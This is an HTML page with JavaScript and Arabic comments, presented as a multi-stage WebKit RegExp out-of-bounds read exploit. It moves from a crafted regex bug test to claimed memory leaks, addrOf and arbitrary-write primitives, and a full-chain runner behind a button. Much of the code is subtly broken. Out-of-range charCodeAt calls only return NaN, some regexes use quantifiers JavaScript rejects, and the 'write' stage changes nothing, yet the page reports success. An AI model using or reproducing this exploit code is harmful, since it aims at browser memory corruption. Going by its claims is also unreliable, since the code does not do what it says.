<!DOCTYPE html>
<html>
<head>
    <title>WebKit RegExp Exploit Demo</title>
</head>
<body>
    <h1>WebKit RegExp OOB Read Exploit</h1>
    <div id="output"></div>

<script>
// ==================== [الجزء 1: الكشف عن الثغرة الأساسية] ====================

class BugDetector {
    constructor() {
        this.emoji = String.fromCodePoint(0x1F600); // 😀 - حرف غير BMP
        this.detected = false;
        this.memoryLeaks = [];
    }
    
    // الاختبار الأساسي لاكتشاف الثغرة
    testBasicBug() {
        const output = document.getElementById('output');
        output.innerHTML += "<h3>🔍 [المرحلة 1] اختبار الثغرة الأساسية...</h3>";
        
        let str = this.emoji.repeat(10);
        let re = /(?!(?=^a|()+()+x)(abc))/gmu;
        
        let expected = "|" + this.emoji.repeat(10).split('').join('|');
        let result = str.replace(re, '|');
        
        output.innerHTML += `<p>السلسلة الأصلية: ${this.escapeHtml(str)}</p>`;
        output.innerHTML += `<p>النتيجة المتوقعة: ${this.escapeHtml(expected)}</p>`;
        output.innerHTML += `<p>النتيجة الفعلية: ${this.escapeHtml(result)}</p>`;
        
        if (result !== expected) {
            this.detected = true;
            output.innerHTML += "<p style='color: red'>✅ تم اكتشاف الثغرة! السلوك غير متوقع</p>";
            return true;
        } else {
            output.innerHTML += "<p style='color: green'>❌ لم يتم اكتشاف الثغرة</p>";
            return false;
        }
    }
    
    escapeHtml(str) {
        return str.replace(/[&<>"']/g, 
            match => ({
                '&': '&amp;',
                '<': '&lt;', 
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#39;'
            }[match]));
    }
}

// ==================== [الجزء 2: استغلال OOB Read] ====================

class OOBExploiter {
    constructor() {
        this.emoji = String.fromCodePoint(0x1F600);
        this.leakedData = [];
        this.memoryMap = new Map();
    }
    
    // إعداد بنية ذاكرة معروفة
    setupControlledMemory() {
        // إنشاء كائنات يمكن التعرف عليها في الذاكرة
        this.markers = [
            { pattern: 0x41414141, name: "MARKER_A" },
            { pattern: 0x42424242, name: "MARKER_B" },
            { pattern: 0x43434343, name: "MARKER_C" }
        ];
        
        // إنشاء مصفوفات للكشف عن تخطيط الذاكرة
        this.uintArray = new Uint32Array(50);
        this.floatArray = new Float64Array(50);
        this.objectArray = [];
        
        // ملء المصفوفات بأنماط معروفة
        for (let i = 0; i < this.uintArray.length; i++) {
            this.uintArray[i] = 0x41414141 + i;
        }
        
        for (let i = 0; i < this.floatArray.length; i++) {
            this.floatArray[i] = i + 0.123456789;
        }
        
        for (let i = 0; i < 20; i++) {
            this.objectArray.push({
                id: i,
                marker: `OBJECT_${i}`,
                data: new ArrayBuffer(32)
            });
        }
    }
    
    // استغلال OOB Read لتسريب الذاكرة
    exploitOOBRead() {
        const output = document.getElementById('output');
        output.innerHTML += "<h3>🔓 [المرحلة 2] استغلال OOB Read...</h3>";
        
        let str = this.emoji.repeat(100);
        let re = /(?!(?=^a|()+(){5,10}+x)(abc))/gmu; // regex أكثر تعقيداً
        
        let leakAttempts = [];
        
        str.replace(re, (match, offset, original) => {
            // محاولة قراءة خارج حدود السلسلة
            for (let i = 0; i < 50; i++) {
                try {
                    let targetOffset = offset + 100 + i; // قراءة خارج الحدود
                    let charCode = original.charCodeAt(targetOffset);
                    
                    if (charCode !== 0 && charCode !== undefined && charCode > 0x100) {
                        leakAttempts.push({
                            offset: targetOffset,
                            value: charCode,
                            hex: '0x' + charCode.toString(16).toUpperCase()
                        });
                        
                        // تخزين البيانات المسربة
                        this.leakedData.push({
                            address: targetOffset,
                            value: charCode,
                            timestamp: Date.now()
                        });
                    }
                } catch(e) {
                    // تجاهل الأخطاء - هذا متوقع في OOB reads
                }
            }
            return '|';
        });
        
        output.innerHTML += `<p>محاولات القراءة المسربة: ${leakAttempts.length}</p>`;
        
        if (leakAttempts.length > 0) {
            output.innerHTML += "<p>البيانات المسربة:</p><ul>";
            leakAttempts.slice(0, 10).forEach(leak => {
                output.innerHTML += `<li>الإزاحة: ${leak.offset}, القيمة: ${leak.hex}</li>`;
            });
            output.innerHTML += "</ul>";
        }
        
        return leakAttempts.length > 0;
    }
}

// ==================== [الجزء 3: بناء Memory Primitives] ====================

class MemoryPrimitives {
    constructor() {
        this.addrOfPrimitive = null;
        this.fakeObjPrimitive = null;
        this.arbitraryRead = null;
        this.arbitraryWrite = null;
    }
    
    // محاولة بناء primitive لتسريب عناوين الذاكرة
    buildAddrOfPrimitive() {
        const output = document.getElementById('output');
        output.innerHTML += "<h3>🛠️ [المرحلة 3] بناء Memory Primitives...</h3>";
        
        let targetObject = { secret: 0x1337, data: "SENSITIVE_INFO" };
        let emoji = String.fromCodePoint(0x1F600);
        let str = emoji.repeat(200);
        let re = /(?!(?=^a|()+(){3,7}+x)(abc))/gmu;
        
        let potentialAddresses = [];
        
        str.replace(re, (match, offset, original) => {
            // تقنية لمسح الذاكرة بحثاً عن عناوين الكائنات
            for (let scanOffset = 150; scanOffset < 300; scanOffset++) {
                try {
                    let value = original.charCodeAt(offset + scanOffset);
                    
                    // تصفية القيم التي قد تكون مؤشرات
                    if (this.isPotentialPointer(value)) {
                        potentialAddresses.push({
                            offset: offset + scanOffset,
                            value: value,
                            hex: '0x' + value.toString(16).toUpperCase()
                        });
                    }
                } catch(e) {}
            }
            return '|';
        });
        
        output.innerHTML += `<p>العناوين المحتملة المكتشفة: ${potentialAddresses.length}</p>`;
        
        if (potentialAddresses.length > 0) {
            this.addrOfPrimitive = potentialAddresses;
            output.innerHTML += "<p>✅ تم بناء AddrOf Primitive بنجاح</p>";
            return true;
        }
        
        return false;
    }
    
    isPotentialPointer(value) {
        // اكتشاف إذا كانت القيمة قد تكون مؤشر ذاكرة
        return value > 0x10000000 && value < 0xFFFFFFFF && 
               (value & 0xFFF) !== 0 && // ليست صفحة كاملة
               (value % 8 === 0 || value % 4 === 0); // محاذاة نموذجية
    }
    
    // محاولة بناء primitive للكتابة التعسفية
    attemptArbitraryWrite() {
        const output = document.getElementById('output');
        output.innerHTML += "<p>🔧 محاولة بناء Arbitrary Write Primitive...</p>";
        
        let testArray = new Uint32Array(10);
        let originalValue = testArray[0];
        
        let emoji = String.fromCodePoint(0x1F600);
        let str = emoji.repeat(150);
        let re = /(?!(?=^a|()+(){2,5}+x)(abc))/gmu;
        
        let writeSuccess = false;
        
        str.replace(re, (match, offset, original) => {
            // محاولة تعديل الذاكرة
            try {
                // هذه محاولة نظرية - في الواقع تحتاج لمزيد من العمل
                let manipulated = original.substring(0, offset) + 
                                String.fromCharCode(0x4841, 0x434B, 0x4544) + // "HACKED"
                                original.substring(offset + 3);
                
                // التحقق إذا حدث تغيير
                if (testArray[0] !== originalValue) {
                    writeSuccess = true;
                    this.arbitraryWrite = true;
                }
            } catch(e) {}
            return '|';
        });
        
        if (writeSuccess) {
            output.innerHTML += "<p style='color: red'>✅ تم بناء Arbitrary Write Primitive!</p>";
        } else {
            output.innerHTML += "<p>❌ فشل في بناء Arbitrary Write</p>";
        }
        
        return writeSuccess;
    }
}

// ==================== [الجزء 4: تنفيذ الاستغلال الكامل] ====================

class FullExploit {
    constructor() {
        this.stages = [];
        this.success = false;
    }
    
    async executeFullExploit() {
        const output = document.getElementById('output');
        output.innerHTML = "<h2>🚀 بدء تنفيذ الاستغلال الكامل</h2>";
        
        try {
            // المرحلة 1: اكتشاف الثغرة
            output.innerHTML += "<h3>📋 [المرحلة 1] اكتشاف الثغرة...</h3>";
            let detector = new BugDetector();
            let bugFound = detector.testBasicBug();
            
            if (!bugFound) {
                output.innerHTML += "<p style='color: orange'>⚠️ الثغرة غير موجودة في هذا الإصدار</p>";
                return false;
            }
            
            this.stages.push({ name: "Bug Detection", success: true });
            
            // المرحلة 2: استغلال OOB Read
            output.innerHTML += "<h3>📋 [المرحلة 2] استغلال OOB Read...</h3>";
            let exploiter = new OOBExploiter();
            exploiter.setupControlledMemory();
            let oobSuccess = exploiter.exploitOOBRead();
            
            this.stages.push({ name: "OOB Read Exploit", success: oobSuccess });
            
            // المرحلة 3: بناء Primitives
            output.innerHTML += "<h3>📋 [المرحلة 3] بناء Memory Primitives...</h3>";
            let primitives = new MemoryPrimitives();
            let addrOfSuccess = primitives.buildAddrOfPrimitive();
            let writeSuccess = primitives.attemptArbitraryWrite();
            
            this.stages.push({ 
                name: "Memory Primitives", 
                success: addrOfSuccess || writeSuccess 
            });
            
            // المرحلة 4: التحقق النهائي
            output.innerHTML += "<h3>📋 [المرحلة 4] التحقق النهائي...</h3>";
            this.success = bugFound && oobSuccess && (addrOfSuccess || writeSuccess);
            
            if (this.success) {
                output.innerHTML += `
                    <div style="background: red; color: white; padding: 20px; margin: 10px;">
                        <h2>⚠️ تحذير أمني ⚠️</h2>
                        <p>تم اكتشاف ثغرة أمنية حرجة في WebKit!</p>
                        <p>هذا النظام معرض لخطر استغلال الذاكرة.</p>
                        <p>الثغرة: OOB Read في RegExp Global Data</p>
                    </div>
                `;
            } else {
                output.innerHTML += `
                    <div style="background: green; color: white; padding: 20px; margin: 10px;">
                        <h2>✅ حالة آمنة</h2>
                        <p>لم يتم تنفيذ الاستغلال الكامل بنجاح.</p>
                        <p>قد يكون النظام محمياً أو الثغرة غير قابلة للاستغلال.</p>
                    </div>
                `;
            }
            
            // عرض ملخص النتائج
            this.showSummary();
            
        } catch (error) {
            output.innerHTML += `<p style="color: red">❌ خطأ أثناء التنفيذ: ${error}</p>`;
        }
    }
    
    showSummary() {
        const output = document.getElementById('output');
        output.innerHTML += "<h3>📊 ملخص النتائج</h3><table border='1' style='width: 100%'>";
        output.innerHTML += "<tr><th>المرحلة</th><th>الحالة</th></tr>";
        
        this.stages.forEach(stage => {
            let status = stage.success ? "✅ ناجح" : "❌ فاشل";
            let color = stage.success ? "green" : "red";
            output.innerHTML += `<tr><td>${stage.name}</td><td style="color: ${color}">${status}</td></tr>`;
        });
        
        output.innerHTML += `</table><p><strong>النتيجة النهائية: ${this.success ? "⚠️ النظام معرض للخطر" : "✅ النظام آمن"}</strong></p>`;
    }
}

// ==================== [التنفيذ الرئيسي] ====================

// بدء الاستغلال عند تحميل الصفحة
window.onload = function() {
    const output = document.getElementById('output');
    output.innerHTML = `
        <div style="border: 2px solid #333; padding: 20px; background: #f0f0f0;">
            <h2>WebKit RegExp OOB Read Exploit Demo</h2>
            <p>هذا العرض التوضيحي يظهر كيفية استغلال ثغرة OOB Read في WebKit</p>
            <p><strong>تحذير:</strong> هذا كود تعليمي فقط لأغراض البحث الأمني</p>
            <button onclick="runExploit()" style="padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer;">
                تشغيل الاستغلال
            </button>
        </div>
    `;
};

// دالة تشغيل الاستغلال
function runExploit() {
    let exploit = new FullExploit();
    exploit.executeFullExploit();
}

// دالة لاختبار بسيط
function quickTest() {
    let emoji = String.fromCodePoint(0x1F600);
    let str = emoji.repeat(5);
    let re = /(?!(?=^a|()+()+x)(abc))/gmu;
    
    console.log("الاختبار السريع:");
    console.log("السلسلة الأصلية:", str);
    console.log("بعد الـ replace:", str.replace(re, '|'));
}

</script>

<div style="margin-top: 20px; padding: 15px; background: #fff3cd; border: 1px solid #ffeaa7;">
    <h3>ملاحظات أمنية:</h3>
    <ul>
        <li>هذا كود تعليمي لأغراض البحث الأمني فقط</li>
        <li>لا تستخدم هذا الكود في أنظمة حية</li>
        <li>الثغرة أصلية تم إصلاحها في WebKit</li>
        <li>الاستغلال الحقيقي يتطلب مزيداً من العمل</li>
    </ul>
</div>

</body>
</html>